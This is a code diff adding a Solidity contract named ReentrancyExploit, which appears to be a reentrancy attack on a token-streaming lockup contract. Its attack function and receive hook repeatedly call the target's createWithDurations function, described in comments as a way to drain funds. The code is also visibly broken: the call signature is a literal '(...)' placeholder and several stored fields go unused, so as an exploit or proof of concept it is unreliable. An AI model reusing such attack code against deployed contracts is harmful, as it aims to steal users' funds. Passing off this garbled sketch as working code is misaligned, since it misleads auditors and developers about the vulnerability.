@@ -1,0 +1,31 @@
+// SPDX-License-Identifier: BUSL-1.1
+pragma solidity >=0.8.22;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+
+contract ReentrancyExploit {
+    using SafeERC20 for IERC20;
+
+    IERC20 public token;
+    address public lockupContract;
+    uint256 public streamId;
+
+    constructor(address _token, address _lockupContract, uint256 _streamId) {
+        token = IERC20(_token);
+        lockupContract = _lockupContract;
+        streamId = _streamId;
+    }
+
+    function attack() external {
+        // Initiate the attack by calling the vulnerable create function
+        lockupContract.call(abi.encodeWithSignature("createWithDurations(...)"));
+    }
+
+    receive() external payable {
+        if (address(lockupContract).balance >= 1 ether) {
+            // Reenter the vulnerable function to drain funds
+            lockupContract.call(abi.encodeWithSignature("createWithDurations(...)"));
+        }
+    }
+}
